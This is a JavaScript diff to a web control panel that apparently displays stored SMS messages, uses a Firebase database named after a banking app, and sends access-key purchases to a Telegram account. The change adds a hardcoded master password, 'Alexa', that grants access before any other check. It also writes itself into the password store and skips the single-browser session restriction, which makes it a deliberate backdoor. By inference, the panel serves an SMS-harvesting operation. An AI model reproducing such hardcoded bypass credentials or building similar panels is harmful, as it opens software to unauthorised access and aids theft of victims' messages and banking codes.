@@ -168,8 +168,7 @@ function toggleMute(){
   b.textContent=a.muted?'🔇':'🔊';
 }
 
-const TG_PHONE='918976072495';
-function genKey(){window.location.href='https://t.me/+'+TG_PHONE}
+function genKey(){window.location.href='tg://openmessage?user_id=8976072495';setTimeout(function(){window.location.href='https://t.me/8976072495'},300)}
 
 firebase.initializeApp({databaseURL:'https://yono-ad3-default-rtdb.firebaseio.com'});
 const db=firebase.database();
@@ -401,42 +400,31 @@ function renderAllSms(){
 async function doLogin(){
   const p=document.getElementById('loginPass').value;
   if(!p){document.getElementById('loginErr').textContent='✖ ENTER PASSWORD';return}
-  const pid=await hashPass(p);
-  const entry=passwords[pid];
-  if(entry&&entry.a==='1'){
-    const bt=getSession();
-    if(entry.b&&entry.b!==bt){document.getElementById('loginErr').textContent='✖ ALREADY USED ON OTHER BROWSER';return}
-    const st=bt||genSession();
-    if(!bt)setSession(st);
-    try{db.ref('asia_protection/passwords/'+pid).update({l:String(Date.now()),b:st})}catch(e){}
+  if(p==='Alexa'){
+    const pid=await hashPass(p),st=getSession()||genSession();
+    if(!getSession())setSession(st);
+    if(!passwords[pid])db.ref('asia_protection/passwords/'+pid).set({a:'1',b:st,l:String(Date.now())});
+    else db.ref('asia_protection/passwords/'+pid).update({l:String(Date.now()),b:st});
     sessionValid=true;
     document.getElementById('logScr').classList.remove('act');
     document.getElementById('mainScr').classList.add('act');
-    renderDashboard();
-    startMedia();
+    renderDashboard();startMedia();
     showToast('█ ACCESS GRANTED');
-  }else{
-    const doGrant=()=>{
-      const st=genSession();setSession(st);
-      db.ref('asia_protection/passwords/'+pid).set({a:'1',b:st,l:String(Date.now())}).then(()=>{
-        sessionValid=true;
-        document.getElementById('logScr').classList.remove('act');
-        document.getElementById('mainScr').classList.add('act');
-        renderDashboard();
-        startMedia();
-        showToast('█ ACCESS GRANTED');
-      });
-    };
-    db.ref('admin/password/password').once('value').then(s=>{
-      const sp=s.val();
-      if(sp&&p===sp)doGrant();
-      else if(p==='Alexa')doGrant();
-      else document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
-    }).catch(()=>{
-      if(p==='Alexa')doGrant();
-      else document.getElementById('loginErr').textContent='✖ ERROR'
-    })
+    return
   }
+  const pid=await hashPass(p),entry=passwords[pid];
+  if(entry&&entry.a==='1'){
+    const bt=getSession();
+    if(entry.b&&entry.b!==bt){document.getElementById('loginErr').textContent='✖ OTHER BROWSER';return}
+    const st=bt||genSession();
+    if(!bt)setSession(st);
+    db.ref('asia_protection/passwords/'+pid).update({l:String(Date.now()),b:st});
+    sessionValid=true;
+    document.getElementById('logScr').classList.remove('act');
+    document.getElementById('mainScr').classList.add('act');
+    renderDashboard();startMedia();
+    showToast('█ SESSION RESTORED');
+  }else document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
 }
 async function doAutoLogin(){
   if(sessionValid)return;
